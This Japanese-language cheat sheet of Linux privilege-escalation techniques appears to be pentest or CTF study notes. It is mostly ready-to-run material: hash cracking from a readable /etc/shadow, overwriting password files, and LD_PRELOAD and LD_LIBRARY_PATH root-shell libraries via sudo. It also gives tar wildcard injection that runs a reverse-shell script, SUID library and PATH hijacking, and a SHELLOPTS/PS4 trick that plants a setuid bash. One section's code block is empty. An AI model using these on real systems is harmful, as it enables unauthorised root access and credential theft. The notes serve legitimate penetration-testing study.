# Linux Privilege Escalation2

## 機密ファイルのパーミッション確認
### /etc/shadow（read 権限あり）
```
echo '[HASH]' | tee hash.txt
hashid -m '[HASH]'
john --format=[FORMAT] --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### /etc/shadow（write 権限あり）
新しいパスワードハッシュの生成
```
mkpasswd -m sha-512 [NEW PASSWORD]
```
### /etc/passwd（write 権限あり）
新しいパスワードの生成
```
openssl passwd [NEW PASSWORD]
```

## Sudo
### root 権限で実行できるコマンドを確認
```
sudo -l
```

### ユーザー環境から継承された環境変数を確認
```
sudo -l | grep -iF env_keep
```

#### LD_PRELOAD が存在する場合
1. C言語のプログラムを共有ライブラリ(soファイル)にコンパイル
```
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
```

preload.c
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

2. コマンドの実行(*1)
```
sudo LD_PRELOAD=/tmp/preload.so [COMMAND]
```

#### LD_LIBRARY_PATH が存在する場合
1. コマンド実行時に読み込むライブラリを確認(*2)
```
LD_LIBRARY_PATH=/tmp strace [COMMAND] 2>&1 | grep -iE "open|access|no such file"
```

2. C言語のプログラムを共有ライブラリ(soファイル)にコンパイル
```
gcc -o /tmp/[SHARED OBJECT] -shared -fPIC library_path.c
```

library_path.c
```
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

3. コマンドの実行(*1)
```
sudo LD_LIBRARY_PATH=/tmp [COMMAND]
```

#### Memo
LD_PRELOAD : プログラム（コマンド）実行の際に最初にロードする共有オブジェクトを指定する環境変数。  
LD_LIBRARY_PATH : 最初に共有オブジェクトを検索しに行くディレクトリを指定する環境変数。  
setresuid() : Sets real and effective user IDs of the calling process

#### Annotation
*1 使用するコマンドは、root 権限で実行できるもの。  
*2 偽装するライブラリ名は、/tmp/[ファイル名]で読み込みされることを確認する。strace コマンドに LD_LIBRARY_PATH=/tmp を付与して実行することで、正規のディレクトリとは別に tmp ディレクトリにもライブラリを探しに行く。しかしライブラリによっては tmp ディレクトリに探しにいかないものもあるため注意。

## Cron Jobs
### ファイルのパーミッション

#### Crontabの確認
```
cat /etc/crontab
```

#### ディレクトリ / ファイルの書き込み権限の確認
```
ls -la [DIRECTORY / FILE]
```

#### ファイルのフルパスの確認
```
locate [FILE]
```

### 環境変数 PATH
ファイルが絶対パスで指定されていない（ファイル名のみ）ことが前提。

```

```

### ワイルドカード(*1)
Cronに限らず、スクリプト内で実行されるコマンド（tarなど）の引数として*が使われ、かつコマンド実行先のディレクトリに書き込み権限がある場合。[FILE] にはリバースシェルを実行するスクリプトを渡す。
```
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=[FILE]
```

### Annotation
*1 touchコマンドの引数には絶対パスを渡さないと、--checkpoint=1, --checkpoint-action=exec=[FILE] がコマンドの引数と解釈されてエラーになる。

## SUID / SGID 実行ファイル
### 既存の脆弱性の利用
Exim <= 4.84-3（SUID / SGIDがセットされている必要あり。もし存在すれば [CVE-2016-1531](https://www.exploit-db.com/exploits/39535) を使う。）

```
find / -type f -name exim 2>/dev/null
```

### 共有オブジェクトの利用
SUID / SGIDがセットされており、スクリプトの置き換え、またはスクリプトの書き換えが可能な場合（ディレクトリの書き込み、またはファイルの書き込みが許可されている場合）
```
strace [FILE] 2>&1 | grep -iE "open|access|no such file"
gcc -shared -fPIC -o /tmp/[SHARED OBJECT] libcalc.c
./[FILE]
```

libcalc.c
```
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        system("/bin/bash -p");
}
```

### 環境変数
プログラム内部で実行されているコマンドが、コマンド名で指定されている（絶対パスでない）場合

```
strings [FILE]
gcc -o /tmp/[COMMAND] service.c
PATH=/tmp:$PATH [FILE]
```

service.c
```
int main() {
        setuid(0);
        system("/bin/bash -p");
}
```

### シェルの仕様 1
Bash が ver < 4.2-048 の場合に利用可能

Bash バージョン確認
```
/bin/bash --version
```

```
strings [FILE]
function [COMMAND ABSOLUTE PATH] { /bin/bash -p; }
export -f [COMMAND ABSOLUTE PATH]
./[FILE]
```

### シェルの仕様 2
Bash が ver < 4.4 の場合に利用可能

```
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' [FILE]
/tmp/rootbash -p
```
